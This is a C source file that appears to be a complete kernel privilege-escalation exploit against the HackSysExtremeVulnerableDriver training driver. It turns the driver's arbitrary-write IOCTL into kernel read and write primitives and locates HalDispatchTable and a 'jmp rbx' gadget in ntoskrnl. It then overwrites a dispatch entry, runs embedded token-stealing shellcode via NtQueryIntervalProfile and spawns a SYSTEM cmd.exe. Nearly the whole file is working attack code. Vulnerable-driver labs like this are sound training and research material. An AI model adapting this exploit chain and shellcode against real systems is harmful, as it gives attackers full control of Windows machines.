#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <string.h>

#pragma comment(lib, "Psapi.lib")

#define QWORD ULONGLONG

#define HEVD_IOCTL_ARBITRARY_WRITE 0x22200B
#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"

#define HALDISPATCHTABLE_FALLBACK_OFFSET 0xC00A60ULL
#define HAL_ENTRY_OFFSET 0x8ULL
#define ProfileTotalIssues 2

#define IMAGE_SCN_MEM_EXECUTE 0x20000000
#define JMP_RBX_BYTE_1 0xFF
#define JMP_RBX_BYTE_2 0xE3

typedef LONG NTSTATUS;

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
    ULONG ProfileSource,
    PULONG Interval
    );

typedef struct _WRITE_WHAT_WHERE
{
    QWORD* What;
    QWORD* Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;


BOOL TriggerWriteWhatWhere(HANDLE hDevice, QWORD* what, QWORD* where)
{
    WRITE_WHAT_WHERE request = { 0 };

    request.What = what;
    request.Where = where;

    DWORD bytesReturned = 0;

    return DeviceIoControl(
        hDevice,
        HEVD_IOCTL_ARBITRARY_WRITE,
        &request,
        sizeof(request),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
}


QWORD ReadQWORD(HANDLE hDevice, QWORD kernelAddress)
{
    QWORD value = 0;

    BOOL ok = TriggerWriteWhatWhere(
        hDevice,
        (QWORD*)kernelAddress,
        &value
    );

    if (!ok)
    {
        printf("[-] ReadQWORD failed at 0x%llx. Error=%lu\n",
            kernelAddress,
            GetLastError()
        );
    }

    return value;
}


BOOL WriteQWORD(HANDLE hDevice, QWORD kernelAddress, QWORD valueToWrite)
{
    QWORD value = valueToWrite;

    BOOL ok = TriggerWriteWhatWhere(
        hDevice,
        &value,
        (QWORD*)kernelAddress
    );

    if (!ok)
    {
        printf("[-] WriteQWORD failed at 0x%llx. Error=%lu\n",
            kernelAddress,
            GetLastError()
        );
    }

    return ok;
}


BYTE ReadBYTE(HANDLE hDevice, QWORD kernelAddress)
{
    QWORD alignedAddress = kernelAddress & ~0x7ULL;
    QWORD value = ReadQWORD(hDevice, alignedAddress);

    DWORD shift = (DWORD)((kernelAddress & 0x7ULL) * 8);

    return (BYTE)((value >> shift) & 0xff);
}


WORD ReadWORD(HANDLE hDevice, QWORD kernelAddress)
{
    WORD value = 0;

    value |= (WORD)ReadBYTE(hDevice, kernelAddress);
    value |= (WORD)ReadBYTE(hDevice, kernelAddress + 1) << 8;

    return value;
}


DWORD ReadDWORD(HANDLE hDevice, QWORD kernelAddress)
{
    DWORD value = 0;

    value |= (DWORD)ReadBYTE(hDevice, kernelAddress);
    value |= (DWORD)ReadBYTE(hDevice, kernelAddress + 1) << 8;
    value |= (DWORD)ReadBYTE(hDevice, kernelAddress + 2) << 16;
    value |= (DWORD)ReadBYTE(hDevice, kernelAddress + 3) << 24;

    return value;
}


BOOL ReadKernelString(HANDLE hDevice, QWORD kernelAddress, char* buffer, DWORD maxLen)
{
    if (!buffer || maxLen == 0)
    {
        return FALSE;
    }

    for (DWORD i = 0; i < maxLen - 1; i++)
    {
        buffer[i] = (char)ReadBYTE(hDevice, kernelAddress + i);

        if (buffer[i] == '\0')
        {
            return TRUE;
        }
    }

    buffer[maxLen - 1] = '\0';
    return TRUE;
}


QWORD ResolveKernelExport(HANDLE hDevice, QWORD imageBase, const char* targetExport)
{
    WORD mz = ReadWORD(hDevice, imageBase);

    if (mz != 0x5A4D) // MZ
    {
        printf("[-] Invalid DOS header. Expected MZ, got 0x%04x\n", mz);
        return 0;
    }

    DWORD e_lfanew = ReadDWORD(hDevice, imageBase + 0x3c);
    QWORD ntHeaders = imageBase + e_lfanew;

    DWORD peSignature = ReadDWORD(hDevice, ntHeaders);

    if (peSignature != 0x00004550) // PE\0\0
    {
        printf("[-] Invalid PE signature. Got 0x%08lx\n", peSignature);
        return 0;
    }

    QWORD optionalHeader = ntHeaders + 0x18;

    WORD magic = ReadWORD(hDevice, optionalHeader);

    if (magic != 0x20b) // PE32+
    {
        printf("[-] Not a PE32+ image. OptionalHeader.Magic = 0x%04x\n", magic);
        return 0;
    }

    DWORD exportDirectoryRva = ReadDWORD(hDevice, optionalHeader + 0x70);

    if (!exportDirectoryRva)
    {
        printf("[-] Export directory RVA is NULL\n");
        return 0;
    }

    QWORD exportDirectory = imageBase + exportDirectoryRva;

    DWORD numberOfNames = ReadDWORD(hDevice, exportDirectory + 0x18);
    DWORD addressOfFunctionsRva = ReadDWORD(hDevice, exportDirectory + 0x1c);
    DWORD addressOfNamesRva = ReadDWORD(hDevice, exportDirectory + 0x20);
    DWORD addressOfNameOrdinalsRva = ReadDWORD(hDevice, exportDirectory + 0x24);

    QWORD addressOfFunctions = imageBase + addressOfFunctionsRva;
    QWORD addressOfNames = imageBase + addressOfNamesRva;
    QWORD addressOfNameOrdinals = imageBase + addressOfNameOrdinalsRva;

    printf("[+] Export directory:        0x%llx\n", exportDirectory);
    printf("[+] NumberOfNames:           %lu\n", numberOfNames);

    for (DWORD i = 0; i < numberOfNames; i++)
    {
        DWORD nameRva = ReadDWORD(
            hDevice,
            addressOfNames + (i * sizeof(DWORD))
        );

        QWORD nameAddress = imageBase + nameRva;

        char exportName[256] = { 0 };

        ReadKernelString(
            hDevice,
            nameAddress,
            exportName,
            sizeof(exportName)
        );

        if (strcmp(exportName, targetExport) == 0)
        {
            WORD ordinal = ReadWORD(
                hDevice,
                addressOfNameOrdinals + (i * sizeof(WORD))
            );

            DWORD functionRva = ReadDWORD(
                hDevice,
                addressOfFunctions + (ordinal * sizeof(DWORD))
            );

            QWORD functionAddress = imageBase + functionRva;

            printf("[+] Found export:            %s\n", exportName);
            printf("[+] Export ordinal:          %u\n", ordinal);
            printf("[+] Export RVA:              0x%lx\n", functionRva);
            printf("[+] Export address:          0x%llx\n", functionAddress);

            return functionAddress;
        }
    }

    printf("[-] Export not found: %s\n", targetExport);
    return 0;
}

QWORD ResolveHalDispatchTable(HANDLE hDevice, QWORD ntBase)
{
    QWORD halDispatchTable = 0;

    printf("[+] Trying dynamic HalDispatchTable export resolution...\n");

    halDispatchTable = ResolveKernelExport(
        hDevice,
        ntBase,
        "HalDispatchTable"
    );

    if (halDispatchTable)
    {
        printf("[+] Dynamic HalDispatchTable resolution succeeded\n");
        return halDispatchTable;
    }

    printf("[!] Dynamic HalDispatchTable resolution failed\n");
    printf("[!] Falling back to hardcoded WinDBG offset: 0x%llx\n",
        HALDISPATCHTABLE_FALLBACK_OFFSET
    );

    halDispatchTable = ntBase + HALDISPATCHTABLE_FALLBACK_OFFSET;

    printf("[+] Fallback HalDispatchTable: 0x%llx\n", halDispatchTable);

    return halDispatchTable;
}

BOOL ReadKernelBytes(
    HANDLE hDevice,
    QWORD kernelAddress,
    BYTE* buffer,
    DWORD length
)
{
    if (!buffer || length == 0)
    {
        return FALSE;
    }

    for (DWORD i = 0; i < length; i++)
    {
        buffer[i] = ReadBYTE(hDevice, kernelAddress + i);
    }

    return TRUE;
}

void ReadSectionName(
    HANDLE hDevice,
    QWORD sectionHeader,
    char* nameBuffer,
    DWORD nameBufferSize
)
{
    if (!nameBuffer || nameBufferSize == 0)
    {
        return;
    }

    ZeroMemory(nameBuffer, nameBufferSize);

    DWORD maxName = min(8, nameBufferSize - 1);

    for (DWORD i = 0; i < maxName; i++)
    {
        nameBuffer[i] = (char)ReadBYTE(hDevice, sectionHeader + i);
    }

    nameBuffer[maxName] = '\0';
}

QWORD FindJmpRbxGadget(HANDLE hDevice, QWORD imageBase)
{
    WORD mz = ReadWORD(hDevice, imageBase);

    if (mz != 0x5A4D)
    {
        printf("[-] Invalid MZ header while searching for gadget\n");
        return 0;
    }

    DWORD e_lfanew = ReadDWORD(hDevice, imageBase + 0x3c);
    QWORD ntHeaders = imageBase + e_lfanew;

    DWORD peSignature = ReadDWORD(hDevice, ntHeaders);

    if (peSignature != 0x00004550)
    {
        printf("[-] Invalid PE signature while searching for gadget\n");
        return 0;
    }

    QWORD fileHeader = ntHeaders + 0x4;

    WORD numberOfSections = ReadWORD(hDevice, fileHeader + 0x2);
    WORD sizeOfOptionalHeader = ReadWORD(hDevice, fileHeader + 0x10);

    QWORD optionalHeader = ntHeaders + 0x18;
    QWORD firstSectionHeader = optionalHeader + sizeOfOptionalHeader;

    printf("[+] Searching executable sections for jmp rbx gadget...\n");
    printf("[+] Number of sections:      %u\n", numberOfSections);

    for (WORD i = 0; i < numberOfSections; i++)
    {
        QWORD sectionHeader = firstSectionHeader + ((QWORD)i * 0x28);

        char sectionName[9] = { 0 };
        ReadSectionName(hDevice, sectionHeader, sectionName, sizeof(sectionName));

        DWORD virtualSize = ReadDWORD(hDevice, sectionHeader + 0x8);
        DWORD virtualAddress = ReadDWORD(hDevice, sectionHeader + 0xC);
        DWORD characteristics = ReadDWORD(hDevice, sectionHeader + 0x24);

        if (!(characteristics & IMAGE_SCN_MEM_EXECUTE))
        {
            continue;
        }

        QWORD sectionStart = imageBase + virtualAddress;
        QWORD sectionEnd = sectionStart + virtualSize;

        printf("[+] Scanning section %-8s 0x%llx - 0x%llx\n",
            sectionName,
            sectionStart,
            sectionEnd
        );

        for (QWORD current = sectionStart; current < sectionEnd - 1; current++)
        {
            BYTE b1 = ReadBYTE(hDevice, current);
            BYTE b2 = ReadBYTE(hDevice, current + 1);

            if (b1 == JMP_RBX_BYTE_1 && b2 == JMP_RBX_BYTE_2)
            {
                printf("[+] Found possible jmp rbx gadget: 0x%llx\n", current);
                printf("[+] Gadget offset from nt base:    0x%llx\n", current - imageBase);

                return current;
            }
        }
    }

    printf("[-] No jmp rbx gadget found\n");
    return 0;
}

QWORD GetKernelBaseAddress(LPCWSTR driverName)
{
    LPVOID drivers[1024] = { 0 };
    DWORD cbNeeded = 0;

    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
    {
        printf("[-] EnumDeviceDrivers failed. Error=%lu\n", GetLastError());
        return 0;
    }

    int driverCount = cbNeeded / sizeof(drivers[0]);

    for (int i = 0; i < driverCount; i++)
    {
        WCHAR currentDriverName[MAX_PATH] = { 0 };

        if (GetDeviceDriverBaseNameW(
            drivers[i],
            currentDriverName,
            MAX_PATH
        ))
        {
            if (_wcsicmp(currentDriverName, driverName) == 0)
            {
                return (QWORD)drivers[i];
            }
        }
    }

    return 0;
}

unsigned char shellcode[] = {
    0x9c, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41,
    0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41,
    0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x65,
    0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
    0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x48,
    0x89, 0xc3, 0x49, 0x89, 0xc4, 0x4d, 0x8b, 0xa4,
    0x24, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xec,
    0x48, 0x04, 0x00, 0x00, 0x4d, 0x8b, 0xac, 0x24,
    0x40, 0x04, 0x00, 0x00, 0x49, 0x83, 0xfd, 0x04,
    0x75, 0xe3, 0x4d, 0x8b, 0xac, 0x24, 0xb8, 0x04,
    0x00, 0x00, 0x49, 0x83, 0xe5, 0xf0, 0x4c, 0x8b,
    0xb3, 0xb8, 0x04, 0x00, 0x00, 0x49, 0x83, 0xe6,
    0x0f, 0x4d, 0x09, 0xf5, 0x4c, 0x89, 0xab, 0xb8,
    0x04, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41,
    0x5d, 0x41, 0x5c, 0x41, 0x5b, 0x41, 0x5a, 0x41,
    0x59, 0x41, 0x58, 0x5d, 0x5f, 0x5e, 0x5a, 0x59,
    0x5b, 0x9d, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xc3
};

int main()
{
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    LPVOID shellcodeAddress = NULL;

    QWORD ntBase = 0;
    QWORD halDispatchTable = 0;
    QWORD halDispatchEntry = 0;
    QWORD originalHalEntry = 0;
    QWORD verifyHalEntry = 0;
    QWORD restoredHalEntry = 0;
    QWORD jmpRbxGadget = 0;

    HMODULE ntdll = NULL;
    NtQueryIntervalProfile_t NtQueryIntervalProfile = NULL;

    ULONG interval = 0;
    NTSTATUS status = 0;

    BOOL halOverwritten = FALSE;

    printf("[+] Opening device: %ls\n", DEVICE_NAME);

    hDevice = CreateFileW(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFileW failed. Error=%lu\n", GetLastError());
        return 1;
    }

    ntBase = GetKernelBaseAddress(L"ntoskrnl.exe");

    if (!ntBase)
    {
        ntBase = GetKernelBaseAddress(L"ntkrnlmp.exe");
    }

    if (!ntBase)
    {
        printf("[-] Failed to find ntoskrnl.exe / ntkrnlmp.exe base\n");
        goto cleanup;
    }

    printf("[+] nt base:                 0x%llx\n", ntBase);

    halDispatchTable = ResolveHalDispatchTable(hDevice, ntBase);

    if (!halDispatchTable)
    {
        printf("[-] Failed to resolve HalDispatchTable\n");
        goto cleanup;
    }

    halDispatchEntry = halDispatchTable + HAL_ENTRY_OFFSET;

    printf("[+] HalDispatchTable:        0x%llx\n", halDispatchTable);
    printf("[+] HalDispatchTable + 0x8:  0x%llx\n", halDispatchEntry);

    shellcodeAddress = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!shellcodeAddress)
    {
        printf("[-] VirtualAlloc failed. Error=%lu\n", GetLastError());
        goto cleanup;
    }

    memcpy(shellcodeAddress, shellcode, sizeof(shellcode));

    printf("[+] Shellcode address:       0x%p\n", shellcodeAddress);

    ntdll = GetModuleHandleA("ntdll.dll");

    if (!ntdll)
    {
        printf("[-] GetModuleHandleA(ntdll.dll) failed. Error=%lu\n", GetLastError());
        goto cleanup;
    }

    NtQueryIntervalProfile =
        (NtQueryIntervalProfile_t)GetProcAddress(
            ntdll,
            "NtQueryIntervalProfile"
        );

    if (!NtQueryIntervalProfile)
    {
        printf("[-] Failed to resolve NtQueryIntervalProfile. Error=%lu\n", GetLastError());
        goto cleanup;
    }

    originalHalEntry = ReadQWORD(hDevice, halDispatchEntry);

    if (!originalHalEntry)
    {
        printf("[-] Failed to read original HalDispatchTable entry\n");
        goto cleanup;
    }

    printf("[+] Original HAL entry:      0x%llx\n", originalHalEntry);

    printf("[+] Overwriting HalDispatchTable + 0x8...\n");

    jmpRbxGadget = FindJmpRbxGadget(hDevice, ntBase);

    if (!jmpRbxGadget)
    {
        printf("[-] Failed to find jmp rbx gadget dynamically\n");
        goto cleanup;
    }

    printf("[+] JMP RBX gadget:          0x%llx\n", jmpRbxGadget);

    if (!WriteQWORD(
        hDevice,
        halDispatchEntry,
        jmpRbxGadget
    ))
    {
        printf("[-] Failed to overwrite HalDispatchTable entry\n");
        goto cleanup;
    }

    halOverwritten = TRUE;

    verifyHalEntry = ReadQWORD(hDevice, halDispatchEntry);

    printf("[+] HAL entry after write:   0x%llx\n", verifyHalEntry);

    if (verifyHalEntry != jmpRbxGadget)
    {
        printf("[-] HAL entry verification failed\n");
        goto cleanup;
    }

    printf("[+] Triggering NtQueryIntervalProfile...\n");

    printf("[+] About to trigger NtQueryIntervalProfile...\n");
    __debugbreak();

    status = NtQueryIntervalProfile(
        ProfileTotalIssues,
        (PULONG)shellcodeAddress
    );

    printf("[+] NtQueryIntervalProfile returned: 0x%lx\n", status);

    printf("[+] Restoring original HAL entry...\n");

    if (!WriteQWORD(hDevice, halDispatchEntry, originalHalEntry))
    {
        printf("[-] Failed to restore original HAL entry\n");
        goto cleanup;
    }

    halOverwritten = FALSE;

    restoredHalEntry = ReadQWORD(hDevice, halDispatchEntry);

    printf("[+] HAL entry after restore: 0x%llx\n", restoredHalEntry);

    if (restoredHalEntry == originalHalEntry)
    {
        printf("[+] HAL entry restored successfully\n");
    }
    else
    {
        printf("[!] HAL entry restore verification mismatch\n");
    }

    printf("[+] Spawning cmd.exe\n");
    system("cmd.exe");

cleanup:

    if (halOverwritten && originalHalEntry)
    {
        printf("[!] Attempting emergency HAL entry restore...\n");
        WriteQWORD(hDevice, halDispatchEntry, originalHalEntry);
    }

    if (shellcodeAddress)
    {
        VirtualFree(shellcodeAddress, 0, MEM_RELEASE);
    }

    if (hDevice != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hDevice);
    }

    return 0;
}